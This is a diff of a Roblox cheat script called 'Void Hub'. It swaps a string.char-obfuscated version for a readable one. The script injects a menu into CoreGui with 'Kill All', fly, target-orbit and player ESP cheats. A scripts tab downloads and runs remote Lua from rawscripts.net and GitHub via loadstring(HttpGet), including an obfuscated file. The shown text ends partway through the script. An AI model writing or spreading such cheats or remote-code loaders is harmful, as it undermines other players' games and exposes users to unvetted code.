@@ -1,1 +1,436 @@
-local _a=game:GetService(string.char(80,108,97,121,101,114,115))local _b=game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))local _c=game:GetService(string.char(67,111,114,101,71,117,105))local _d=game:GetService(string.char(76,105,103,104,116,105,110,103))local _e=_a._e local _f=_e:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))if _c and pcall(function()return _c.Name end)then _f=_c end if _f:FindFirstChild(string.char(86,111,105,100,72,117,98,86,54))then _f.VoidHubV6:Destroy()end local _g=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_g.Name=string.char(86,111,105,100,72,117,98,86,54)_g.ResetOnSpawn=false _g.Parent=_f local _h,_i,_j,_k,_l,_m=false,false,false,false,false,false local _n,_o=false,false local _p=85 local _q=Instance.new(string.char(70,114,97,109,101))_q.Name=string.char(70,108,121,67,111,110,116,114,111,108,115)_q.Size=UDim2.new(1,0,1,0)_q.BackgroundTransparency=1 _q.Visible=false _q.Parent=_g local function _r(_s,_t,_u,_v)local _w=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))_w.Name=_s _w.Size=UDim2.new(0,52,0,52)_w.Position=_u _w.BackgroundColor3=Color3.fromRGB(18,18,26)_w.BackgroundTransparency=0.2 _w.Text=_t _w.TextColor3=Color3.fromRGB(255,255,255)_w.TextSize=20 _w.Font=Enum.Font.GothamBold _w.Parent=_v Instance.new(string.char(85,73,67,111,114,110,101,114),_w).CornerRadius=UDim.new(0,14)local _x=Instance.new(string.char(85,73,83,116,114,111,107,101),_w)_x.Color=Color3.fromRGB(138,43,226)_x.Thickness=1.4 return _w end local _y=Instance.new(string.char(70,114,97,109,101),_q)_y.Size=UDim2.new(0,160,0,160)_y.Position=UDim2.new(0,25,1,-190)_y.BackgroundTransparency=1 local _z=_r(string.char(85,112),string.char(9650),UDim2.new(0.5,-26,0,0),_y)local _A=_r(string.char(68,111,119,110),string.char(9660),UDim2.new(0.5,-26,1,-52),_y)local _B=_r(string.char(76,101,102,116),string.char(9668),UDim2.new(0,0,0.5,-26),_y)local _C=_r(string.char(82,105,103,104,116),string.char(9658),UDim2.new(1,-52,0.5,-26),_y)local _D=Instance.new(string.char(70,114,97,109,101),_q)_D.Size=UDim2.new(0,52,0,120)_D.Position=UDim2.new(1,-75,1,-170)_D.BackgroundTransparency=1 local _E=_r(string.char(65,115,99,101,110,100),string.char(11014),UDim2.new(0,0,0,0),_D)local _F=_r(string.char(68,101,115,99,101,110,100),string.char(11015),UDim2.new(0,0,1,-52),_D)local _H={Forward=false,Backward=false,_B=false,_C=false,_z=false,_A=false}local function _I(_w,_J)_w.InputBegan:Connect(function(_K)if _K.UserInputType==Enum.UserInputType.MouseButton1 or _K.UserInputType==Enum.UserInputType.Touch then _H[_J]=true end end)_w.InputEnded:Connect(function(_K)if _K.UserInputType==Enum.UserInputType.MouseButton1 or _K.UserInputType==Enum.UserInputType.Touch then _H[_J]=false end end)end _I(_z,string.char(70,111,114,119,97,114,100))_I(_A,string.char(66,97,99,107,119,97,114,100))_I(_B,string.char(76,101,102,116))_I(_C,string.char(82,105,103,104,116))_I(_E,string.char(85,112))_I(_F,string.char(68,111,119,110))local function _L(_M)_i=_M _q.Visible=_i local _N=_e.Character local _O=_N and _N:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _i and _O then local _P=Instance.new(string.char(66,111,100,121,86,101,108,111,99,105,116,121))_P.Name=string.char(70,108,121,66,86)_P.MaxForce=Vector3.new(1e6,1e6,1e6)_P.Parent=_O else for _Q in pairs(_H)do _H[_Q]=false end if _O and _O:FindFirstChild(string.char(70,108,121,66,86))then _O.FlyBV:Destroy()end end end _b.RenderStepped:Connect(function()if _i then local _N=_e.Character local _O=_N and _N:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))local _P=_O and _O:FindFirstChild(string.char(70,108,121,66,86))if _P then local _R=Vector3.zero local _S=workspace.CurrentCamera.CFrame if _H.Forward then _R=_R+_S.LookVector end if _H.Backward then _R=_R-_S.LookVector end if _H._B then _R=_R-_S.RightVector end if _H._C then _R=_R+_S.RightVector end if _H._z then _R=_R+Vector3.new(0,1,0)end if _H._A then _R=_R-Vector3.new(0,1,0)end _P.Velocity=(_R.Magnitude>0)and(_R.Unit*_p)or Vector3.zero end end end)local _T=Instance.new(string.char(70,114,97,109,101))_T.Name=string.char(77,97,105,110,70,114,97,109,101)_T.Size=UDim2.new(0,310,0,370)_T.Position=UDim2.new(0.5,-155,0.5,-185)_T.BackgroundColor3=Color3.fromRGB(11,10,16)_T.Active=true _T.Draggable=true _T.Parent=_g Instance.new(string.char(85,73,67,111,114,110,101,114),_T).CornerRadius=UDim.new(0,16)local _U=Instance.new(string.char(85,73,83,116,114,111,107,101),_T)_U.Color=Color3.fromRGB(138,43,226)_U.Thickness=1.8 local _V=Instance.new(string.char(70,114,97,109,101),_T)_V.Size=UDim2.new(1,0,0,44)_V.BackgroundTransparency=1 local _W=Instance.new(string.char(84,101,120,116,76,97,98,101,108),_V)_W.Size=UDim2.new(1,0,0,24)_W.Position=UDim2.new(0,0,0,6)_W.BackgroundTransparency=1 _W.Text=string.char(86,79,73,68,32,72,85,66)_W.TextColor3=Color3.fromRGB(168,85,247)_W.TextSize=16 _W.Font=Enum.Font.GothamBold local _X=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110),_V)_X.Size=UDim2.new(0,26,0,26)_X.Position=UDim2.new(0,10,0.5,-13)_X.BackgroundColor3=Color3.fromRGB(24,20,35)_X.Text=string.char(45)_X.TextColor3=Color3.fromRGB(255,255,255)_X.Font=Enum.Font.GothamBold _X.TextSize=16 Instance.new(string.char(85,73,67,111,114,110,101,114),_X).CornerRadius=UDim.new(0,6)local _Y=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110),_V)_Y.Size=UDim2.new(0,26,0,26)_Y.Position=UDim2.new(1,-36,0.5,-13)_Y.BackgroundColor3=Color3.fromRGB(24,20,35)_Y.Text=string.char(55357,56595)_Y.TextSize=12 Instance.new(string.char(85,73,67,111,114,110,101,114),_Y).CornerRadius=UDim.new(0,6)local _Z=Instance.new(string.char(70,114,97,109,101),_T)_Z.Size=UDim2.new(1,-20,0,32)_Z.Position=UDim2.new(0,10,0,44)_Z.BackgroundColor3=Color3.fromRGB(18,16,26)Instance.new(string.char(85,73,67,111,114,110,101,114),_Z).CornerRadius=UDim.new(0,8)local _aa=Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116),_Z)_aa.FillDirection=Enum.FillDirection.Horizontal _aa.HorizontalAlignment=Enum.HorizontalAlignment.Center _aa.Padding=UDim.new(0,4)local _ba=Instance.new(string.char(70,114,97,109,101),_T)_ba.Size=UDim2.new(1,-20,1,-90)_ba.Position=UDim2.new(0,10,0,82)_ba.BackgroundTransparency=1 local _ca={}local function _da(_s)local _ea=Instance.new(string.char(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_ba)_ea.Size=UDim2.new(1,0,1,0)_ea.BackgroundTransparency=1 _ea.CanvasSize=UDim2.new(0,0,0,300)_ea.ScrollBarThickness=0 _ea.Visible=false local _fa=Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116),_ea)_fa.Padding=UDim.new(0,6)_ca[_s]=_ea return _ea end local _ga=_da(string.char(77,97,105,110))local _ha=_da(string.char(69,120,116,114,97,115))local _ia=_da(string.char(83,99,114,105,112,116,115))_ga.Visible=true local function _ja(_s,_ka,_la)local _w=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110),_Z)_w.Size=UDim2.new(0.31,0,1,0)_w.BackgroundTransparency=1 _w.Text=_ka..string.char(32).._s _w.TextColor3=(_la.Visible)and Color3.fromRGB(216,180,254)or Color3.fromRGB(120,120,150)_w.Font=Enum.Font.GothamBold _w.TextSize=10 _w.MouseButton1Click:Connect(function()for _ma,_na in pairs(_ca)do _na.Visible=false end for _ma,_oa in pairs(_Z:GetChildren())do if _oa:IsA(string.char(84,101,120,116,66,117,116,116,111,110))then _oa.TextColor3=Color3.fromRGB(120,120,150)end end _la.Visible=true _w.TextColor3=Color3.fromRGB(216,180,254)end)end _ja(string.char(73,110,105,99,105,111),string.char(9876,65039),_ga)_ja(string.char(86,105,115,117,97,105,115),string.char(55357,56385,65039),_ha)_ja(string.char(83,99,114,105,112,116,115),string.char(55357,56540),_ia)local function _pa(_v,_t,_ka,_qa)local _w=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110),_v)_w.Size=UDim2.new(1,0,0,38)_w.BackgroundColor3=Color3.fromRGB(20,18,30)_w.Text=string.char(32,32,32).._ka..string.char(32,32).._t _w.TextColor3=Color3.fromRGB(200,200,220)_w.Font=Enum.Font.GothamBold _w.TextSize=11 _w.TextXAlignment=Enum.TextXAlignment._B Instance.new(string.char(85,73,67,111,114,110,101,114),_w).CornerRadius=UDim.new(0,8)local _x=Instance.new(string.char(85,73,83,116,114,111,107,101),_w)_x.Color=Color3.fromRGB(50,40,70)_x.Thickness=1 local _M=false _w.MouseButton1Click:Connect(function()_M=not _M _w.BackgroundColor3=_M and Color3.fromRGB(138,43,226)or Color3.fromRGB(20,18,30)_w.TextColor3=_M and Color3.fromRGB(255,255,255)or Color3.fromRGB(200,200,220)_x.Color=_M and Color3.fromRGB(168,85,247)or Color3.fromRGB(50,40,70)_qa(_M)end)end local function _ra(_v,_t,_ka,_sa)local _w=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110),_v)_w.Size=UDim2.new(1,0,0,38)_w.BackgroundColor3=Color3.fromRGB(24,20,36)_w.Text=string.char(32,32,32).._ka..string.char(32,32).._t _w.TextColor3=Color3.fromRGB(216,180,254)_w.Font=Enum.Font.GothamBold _w.TextSize=11 _w.TextXAlignment=Enum.TextXAlignment._B Instance.new(string.char(85,73,67,111,114,110,101,114),_w).CornerRadius=UDim.new(0,8)local _x=Instance.new(string.char(85,73,83,116,114,111,107,101),_w)_x.Color=Color3.fromRGB(138,43,226)_x.Transparency=0.6 _w.MouseButton1Click:Connect(function()pcall(function()loadstring(game:HttpGet(_sa))()end)end)end _pa(_ga,string.char(75,105,108,108,32,65,108,108),string.char(9876,65039),function(_ta)_h=_ta end)_pa(_ga,string.char(70,111,99,117,115,32,79,114,98,105,116,32,40,65,108,118,111,41),string.char(55356,57263),function(_ta)_m=_ta end)_pa(_ga,string.char(70,108,121,32,77,111,98,105,108,101),string.char(55357,56960),function(_ta)_L(_ta)end)_pa(_ha,string.char(69,83,80,32,74,111,103,97,100,111,114,101,115),string.char(55357,56385,65039),function(_ta)_j=_ta end)_pa(_ha,string.char(69,83,80,32,68,117,109,109,121),string.char(55356,57263),function(_ta)_k=_ta end)_pa(_ha,string.char(70,80,83,32,66,111,111,115,116,101,114,32,40,84,101,120,116,117,114,97,32,76,105,115,97,41),string.char(9889),function(_ta)_l=_ta if _l then pcall(function()_d.GlobalShadows=false for _ma,_ua in pairs(workspace:GetDescendants())do if _ua:IsA(string.char(66,97,115,101,80,97,114,116))then _ua.Material=Enum.Material.SmoothPlastic end end end)end end)_ra(_ia,string.char(74,117,106,117,116,115,117,101,114,32,83,99,114,105,112,116),string.char(9654),string.char(104,116,116,112,115,58,47,47,114,97,119,115,99,114,105,112,116,115,46,110,101,116,47,114,97,119,47,74,117,106,117,116,115,117,45,83,104,101,110,97,110,105,103,97,110,115,45,74,117,106,117,116,115,117,101,114,45,54,50,55,56,53))_ra(_ia,string.char(84,83,66,32,83,108,105,100,101,32,68,97,115,104),string.char(9654),string.char(104,116,116,112,115,58,47,47,114,97,119,115,99,114,105,112,116,115,46,110,101,116,47,114,97,119,47,84,104,101,45,83,116,114,111,110,103,101,115,116,45,66,97,116,116,108,101,103,114,111,117,110,100,115,45,84,115,66,45,115,108,105,100,101,45,100,97,115,104,45,56,49,57,49,56))_ra(_ia,string.char(73,110,115,116,97,110,116,32,66,108,97,99,107,32,72,111,108,101),string.char(9654),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,114,97,103,111,110,102,108,121,53,49,48,49,47,77,105,110,111,115,114,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,73,110,115,116,97,110,116,66,108,97,99,107,72,111,108,101,46,74,74,83))_ra(_ia,string.char(76,111,99,107,45,79,110,32,65,117,116,111),string.char(9654),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,98,49,55,49,49,49,51,50,54,45,104,117,101,47,76,111,99,107,45,79,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,111,98,102,117,115,99,97,116,101,100,95,115,99,114,105,112,116,45,49,55,56,54,50,50,54,48,51,48,49,48,50,46,108,117,97,46,116,120,116))_X.MouseButton1Click:Connect(function()_n=not _n _ba.Visible=not _n _Z.Visible=not _n _T.Size=_n and UDim2.new(0,310,0,44)or UDim2.new(0,310,0,370)_X.Text=_n andstring.char(43)orstring.char(45)end)_Y.MouseButton1Click:Connect(function()_o=not _o _T.Draggable=not _o _Y.Text=_o andstring.char(55357,56594)orstring.char(55357,56595)end)_b.RenderStepped:Connect(function()for _ma,_va in pairs(_a:GetPlayers())do if _va~=_e and _va.Character then local _wa=_va.Character:FindFirstChild(string.char(86,111,105,100,69,83,80))if _j then if not _wa then _wa=Instance.new(string.char(72,105,103,104,108,105,103,104,116))_wa.Name=string.char(86,111,105,100,69,83,80)_wa.FillColor=Color3.fromRGB(138,43,226)_wa.Parent=_va.Character end elseif _wa then _wa:Destroy()end end end end)task.spawn(function()while task.wait(1)do pcall(function()for _ma,_xa in pairs(workspace:GetDescendants())do if _xa:IsA(string.char(77,111,100,101,108))and _xa:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))and not _a:GetPlayerFromCharacter(_xa)then local _wa=_xa:FindFirstChild(string.char(86,111,105,100,68,117,109,109,121,69,83,80))if _k then if not _wa then _wa=Instance.new(string.char(72,105,103,104,108,105,103,104,116))_wa.Name=string.char(86,111,105,100,68,117,109,109,121,69,83,80)_wa.FillColor=Color3.fromRGB(0,255,150)_wa.Parent=_xa end elseif _wa then _wa:Destroy()end end end end)end end)local _ya=0 local _za=4.5 local _Aa=12 local function _Ba()local _Ca,_Da=nil,math.huge local _Ea=_e.Character local _Fa=_Ea and _Ea:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if not _Fa then return nil end for _ma,_va in pairs(_a:GetPlayers())do if _va~=_e and _va.Character then local _Ga=_va.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))local _Ha=_va.Character:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))if _Ga and _Ha and _Ha.Health>0 then local _Ia=(_Fa.Position-_Ga.Position).Magnitude if _Ia<_Da then _Da=_Ia _Ca=_Ga end end end end return _Ca end _b.RenderStepped:Connect(function(_Ja)if _m then local _Ea=_e.Character local _Fa=_Ea and _Ea:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))local _Ka=_Ba()if _Fa and _Ka then _Fa.AssemblyLinearVelocity=Vector3.zero _ya=_ya+(_Aa*_Ja)local _La=Vector3.new(math.cos(_ya)*_za,0,math.sin(_ya)*_za)_Fa.CFrame=CFrame.new(_Ka.Position+_La,_Ka.Position)end end end)task.spawn(function()while true do task.wait(0.05)if _h and _e.Character and _e.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))then local _Fa=_e.Character.HumanoidRootPart local _Ma=_e.Character:FindFirstChildOfClass(string.char(84,111,111,108))or(_e.Backpack and _e.Backpack:FindFirstChildOfClass(string.char(84,111,111,108)))if _Ma and _Ma.Parent~=_e.Character then _Ma.Parent=_e.Character end for _ma,_Na in pairs(_a:GetPlayers())do if not _h then break end if _Na~=_e and _Na.Character then local _Ha=_Na.Character:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))local _Ga=_Na.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _Ha and _Ha.Health>0 and _Ga then _Fa.AssemblyLinearVelocity=Vector3.zero _Fa.CFrame=_Ga.CFrame*CFrame.new(0,0,-1.5)*CFrame.Angles(0,math.pi,0)if _Ma then _Ma:Activate()end task.wait(0.05)end end end end end end)
+-- // VOID HUB v6.2 (DESIGN PREMIUM + FOCUS ORBIT ROUBADO)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local LocalPlayer = Players.LocalPlayer
+
+local TargetParent = LocalPlayer:WaitForChild("PlayerGui")
+if CoreGui and pcall(function() return CoreGui.Name end) then
+    TargetParent = CoreGui
+end
+
+if TargetParent:FindFirstChild("VoidHubV6") then 
+    TargetParent.VoidHubV6:Destroy() 
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "VoidHubV6"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = TargetParent
+
+local gojoActive, flyActive, espActive, espDummyActive, fpsBoosterActive, focusActive = false, false, false, false, false, false
+local isMinimized, isLocked = false, false
+local flySpeed = 85
+
+-- Controles do Fly
+local FlyGui = Instance.new("Frame")
+FlyGui.Name = "FlyControls"
+FlyGui.Size = UDim2.new(1, 0, 1, 0)
+FlyGui.BackgroundTransparency = 1
+FlyGui.Visible = false
+FlyGui.Parent = ScreenGui
+
+local function MakeArrow(name, text, pos, parent)
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Size = UDim2.new(0, 52, 0, 52)
+    btn.Position = pos
+    btn.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
+    btn.BackgroundTransparency = 0.2
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 20
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = parent
+    
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 14)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = Color3.fromRGB(138, 43, 226)
+    stroke.Thickness = 1.4
+    return btn
+end
+
+local LPad = Instance.new("Frame", FlyGui)
+LPad.Size = UDim2.new(0, 160, 0, 160)
+LPad.Position = UDim2.new(0, 25, 1, -190)
+LPad.BackgroundTransparency = 1
+
+local Up = MakeArrow("Up", "▲", UDim2.new(0.5, -26, 0, 0), LPad)
+local Down = MakeArrow("Down", "▼", UDim2.new(0.5, -26, 1, -52), LPad)
+local Left = MakeArrow("Left", "◄", UDim2.new(0, 0, 0.5, -26), LPad)
+local Right = MakeArrow("Right", "►", UDim2.new(1, -52, 0.5, -26), LPad)
+
+local RPad = Instance.new("Frame", FlyGui)
+RPad.Size = UDim2.new(0, 52, 0, 120)
+RPad.Position = UDim2.new(1, -75, 1, -170)
+RPad.BackgroundTransparency = 1
+
+local Asc = MakeArrow("Ascend", "⬆", UDim2.new(0, 0, 0, 0), RPad)
+local Desc = MakeArrow("Descend", "⬇", UDim2.new(0, 0, 1, -52), RPad)
+
+local inputs = {Forward = false, Backward = false, Left = false, Right = false, Up = false, Down = false}
+
+local function HoldBind(btn, key)
+    btn.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            inputs[key] = true
+        end
+    end)
+    btn.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            inputs[key] = false
+        end
+    end)
+end
+
+HoldBind(Up, "Forward")
+HoldBind(Down, "Backward")
+HoldBind(Left, "Left")
+HoldBind(Right, "Right")
+HoldBind(Asc, "Up")
+HoldBind(Desc, "Down")
+
+local function ToggleFly(state)
+    flyActive = state
+    FlyGui.Visible = flyActive
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if flyActive and root then
+        local bv = Instance.new("BodyVelocity")
+        bv.Name = "FlyBV"
+        bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+        bv.Parent = root
+    else
+        for k in pairs(inputs) do inputs[k] = false end
+        if root and root:FindFirstChild("FlyBV") then
+            root.FlyBV:Destroy()
+        end
+    end
+end
+
+RunService.RenderStepped:Connect(function()
+    if flyActive then
+        local char = LocalPlayer.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        local bv = root and root:FindFirstChild("FlyBV")
+        if bv then
+            local vel = Vector3.zero
+            local camCF = workspace.CurrentCamera.CFrame
+            if inputs.Forward then vel = vel + camCF.LookVector end
+            if inputs.Backward then vel = vel - camCF.LookVector end
+            if inputs.Left then vel = vel - camCF.RightVector end
+            if inputs.Right then vel = vel + camCF.RightVector end
+            if inputs.Up then vel = vel + Vector3.new(0, 1, 0) end
+            if inputs.Down then vel = vel - Vector3.new(0, 1, 0) end
+            bv.Velocity = (vel.Magnitude > 0) and (vel.Unit * flySpeed) or Vector3.zero
+        end
+    end
+end)
+
+-- Main Frame
+local Main = Instance.new("Frame")
+Main.Name = "MainFrame"
+Main.Size = UDim2.new(0, 310, 0, 370)
+Main.Position = UDim2.new(0.5, -155, 0.5, -185)
+Main.BackgroundColor3 = Color3.fromRGB(11, 10, 16)
+Main.Active = true
+Main.Draggable = true
+Main.Parent = ScreenGui
+
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
+
+local MainStroke = Instance.new("UIStroke", Main)
+MainStroke.Color = Color3.fromRGB(138, 43, 226)
+MainStroke.Thickness = 1.8
+
+-- TopBar
+local TopBar = Instance.new("Frame", Main)
+TopBar.Size = UDim2.new(1, 0, 0, 44)
+TopBar.BackgroundTransparency = 1
+
+local Title = Instance.new("TextLabel", TopBar)
+Title.Size = UDim2.new(1, 0, 0, 24)
+Title.Position = UDim2.new(0, 0, 0, 6)
+Title.BackgroundTransparency = 1
+Title.Text = "VOID HUB"
+Title.TextColor3 = Color3.fromRGB(168, 85, 247)
+Title.TextSize = 16
+Title.Font = Enum.Font.GothamBold
+
+local MinBtn = Instance.new("TextButton", TopBar)
+MinBtn.Size = UDim2.new(0, 26, 0, 26)
+MinBtn.Position = UDim2.new(0, 10, 0.5, -13)
+MinBtn.BackgroundColor3 = Color3.fromRGB(24, 20, 35)
+MinBtn.Text = "-"
+MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinBtn.Font = Enum.Font.GothamBold
+MinBtn.TextSize = 16
+Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 6)
+
+local LockBtn = Instance.new("TextButton", TopBar)
+LockBtn.Size = UDim2.new(0, 26, 0, 26)
+LockBtn.Position = UDim2.new(1, -36, 0.5, -13)
+LockBtn.BackgroundColor3 = Color3.fromRGB(24, 20, 35)
+LockBtn.Text = "🔓"
+LockBtn.TextSize = 12
+Instance.new("UICorner", LockBtn).CornerRadius = UDim.new(0, 6)
+
+-- Barra de Abas
+local TabBar = Instance.new("Frame", Main)
+TabBar.Size = UDim2.new(1, -20, 0, 32)
+TabBar.Position = UDim2.new(0, 10, 0, 44)
+TabBar.BackgroundColor3 = Color3.fromRGB(18, 16, 26)
+Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 8)
+
+local TabListLayout = Instance.new("UIListLayout", TabBar)
+TabListLayout.FillDirection = Enum.FillDirection.Horizontal
+TabListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+TabListLayout.Padding = UDim.new(0, 4)
+
+-- Conteúdo
+local ContentArea = Instance.new("Frame", Main)
+ContentArea.Size = UDim2.new(1, -20, 1, -90)
+ContentArea.Position = UDim2.new(0, 10, 0, 82)
+ContentArea.BackgroundTransparency = 1
+
+local tabs = {}
+local function CreateTabSection(name)
+    local tab = Instance.new("ScrollingFrame", ContentArea)
+    tab.Size = UDim2.new(1, 0, 1, 0)
+    tab.BackgroundTransparency = 1
+    tab.CanvasSize = UDim2.new(0, 0, 0, 300)
+    tab.ScrollBarThickness = 0
+    tab.Visible = false
+    
+    local layout = Instance.new("UIListLayout", tab)
+    layout.Padding = UDim.new(0, 6)
+    
+    tabs[name] = tab
+    return tab
+end
+
+local MainTab = CreateTabSection("Main")
+local VisualsTab = CreateTabSection("Extras")
+local ScriptsTab = CreateTabSection("Scripts")
+
+MainTab.Visible = true
+
+local function AddTabBtn(name, icon, tabRef)
+    local btn = Instance.new("TextButton", TabBar)
+    btn.Size = UDim2.new(0.31, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = icon .. " " .. name
+    btn.TextColor3 = (tabRef.Visible) and Color3.fromRGB(216, 180, 254) or Color3.fromRGB(120, 120, 150)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 10
+
+    btn.MouseButton1Click:Connect(function()
+        for _, t in pairs(tabs) do t.Visible = false end
+        for _, b in pairs(TabBar:GetChildren()) do
+            if b:IsA("TextButton") then b.TextColor3 = Color3.fromRGB(120, 120, 150) end
+        end
+        tabRef.Visible = true
+        btn.TextColor3 = Color3.fromRGB(216, 180, 254)
+    end)
+end
+
+AddTabBtn("Inicio", "⚔️", MainTab)
+AddTabBtn("Visuais", "👁️", VisualsTab)
+AddTabBtn("Scripts", "📜", ScriptsTab)
+
+-- Funções de Elementos
+local function CreateToggle(parent, text, icon, callback)
+    local btn = Instance.new("TextButton", parent)
+    btn.Size = UDim2.new(1, 0, 0, 38)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 18, 30)
+    btn.Text = "   " .. icon .. "  " .. text
+    btn.TextColor3 = Color3.fromRGB(200, 200, 220)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = Color3.fromRGB(50, 40, 70)
+    stroke.Thickness = 1
+
+    local state = false
+    btn.MouseButton1Click:Connect(function()
+        state = not state
+        btn.BackgroundColor3 = state and Color3.fromRGB(138, 43, 226) or Color3.fromRGB(20, 18, 30)
+        btn.TextColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 200, 220)
+        stroke.Color = state and Color3.fromRGB(168, 85, 247) or Color3.fromRGB(50, 40, 70)
+        callback(state)
+    end)
+end
+
+local function CreateScriptBtn(parent, text, icon, link)
+    local btn = Instance.new("TextButton", parent)
+    btn.Size = UDim2.new(1, 0, 0, 38)
+    btn.BackgroundColor3 = Color3.fromRGB(24, 20, 36)
+    btn.Text = "   " .. icon .. "  " .. text
+    btn.TextColor3 = Color3.fromRGB(216, 180, 254)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = Color3.fromRGB(138, 43, 226)
+    stroke.Transparency = 0.6
+
+    btn.MouseButton1Click:Connect(function()
+        pcall(function() loadstring(game:HttpGet(link))() end)
+    end)
+end
+
+-- Botões Inicio
+CreateToggle(MainTab, "Kill All", "⚔️", function(s) gojoActive = s end)
+CreateToggle(MainTab, "Focus Orbit (Alvo)", "🎯", function(s) focusActive = s end)
+CreateToggle(MainTab, "Fly Mobile", "🚀", function(s) ToggleFly(s) end)
+
+-- Botões Visuais & Extras
+CreateToggle(VisualsTab, "ESP Jogadores", "👁️", function(s) espActive = s end)
+CreateToggle(VisualsTab, "ESP Dummy", "🎯", function(s) espDummyActive = s end)
+CreateToggle(VisualsTab, "FPS Booster (Textura Lisa)", "⚡", function(s)
+    fpsBoosterActive = s
+    if fpsBoosterActive then
+        pcall(function()
+            Lighting.GlobalShadows = false
+            for _, v in pairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    v.Material = Enum.Material.SmoothPlastic
+                end
+            end
+        end)
+    end
+end)
+
+-- Botões Scripts Externos
+CreateScriptBtn(ScriptsTab, "Jujutsuer Script", "▶", "https://rawscripts.net/raw/Jujutsu-Shenanigans-Jujutsuer-62785")
+CreateScriptBtn(ScriptsTab, "TSB Slide Dash", "▶", "https://rawscripts.net/raw/The-Strongest-Battlegrounds-TsB-slide-dash-81918")
+CreateScriptBtn(ScriptsTab, "Instant Black Hole", "▶", "https://raw.githubusercontent.com/Dragonfly5101/Minosr/refs/heads/main/InstantBlackHole.JJS")
+CreateScriptBtn(ScriptsTab, "Lock-On Auto", "▶", "https://raw.githubusercontent.com/b17111326-hue/Lock-On/refs/heads/main/obfuscated_script-1786226030102.lua.txt")
+
+-- Ações Minimizar/Bloquear
+MinBtn.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    ContentArea.Visible = not isMinimized
+    TabBar.Visible = not isMinimized
+    Main.Size = isMinimized and UDim2.new(0, 310, 0, 44) or UDim2.new(0, 310, 0, 370)
+    MinBtn.Text = isMinimized and "+" or "-"
+end)
+
+LockBtn.MouseButton1Click:Connect(function()
+    isLocked = not isLocked
+    Main.Draggable = not isLocked
+    LockBtn.Text = isLocked and "🔒" or "🔓"
+end)
+
+-- Sistema ESP Jogadores
+RunService.RenderStepped:Connect(function()
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local hl = p.Character:FindFirstChild("VoidESP")
+            if espActive then
+                if not hl then
+                    hl = Instance.new("Highlight")
+                    hl.Name = "VoidESP"
+                    hl.FillColor = Color3.fromRGB(138, 43, 226)
+                    hl.Parent = p.Character
+                end
+            elseif hl then
+                hl:Destroy()
+            end
+        end
+    end
+end)
+
+-- Sistema ESP Dummy
+task.spawn(function()
